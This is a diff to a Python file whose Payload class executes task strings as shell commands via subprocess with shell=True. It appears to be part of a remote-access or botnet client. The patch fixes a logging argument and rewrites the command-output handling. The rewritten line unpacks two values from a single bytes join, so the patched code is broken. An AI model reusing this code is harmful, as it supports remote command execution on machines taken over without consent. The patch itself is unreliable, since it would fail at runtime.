@@ -35,7 +35,7 @@ except ImportError:
     pass
 
 def log(info, level='debug'):
-    logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
+    logging.basicConfig(level=logging.DEBUG, handlers=[logging.StreamHandler()])
     logger = logging.getLogger(__name__)
     getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))
 
@@ -1087,7 +1087,9 @@ class Payload():
                             if command:
                                 result = bytes(command(action) if action else command())
                             else:
-                                result = bytes().join(subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                                result, reserr = bytes().join(subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                                if result == None and reserr != None:
+                                    result = reserr
                         except Exception as e:
                             result = "{} error: {}".format(self.run.func_name, str(e))
                             log(result)
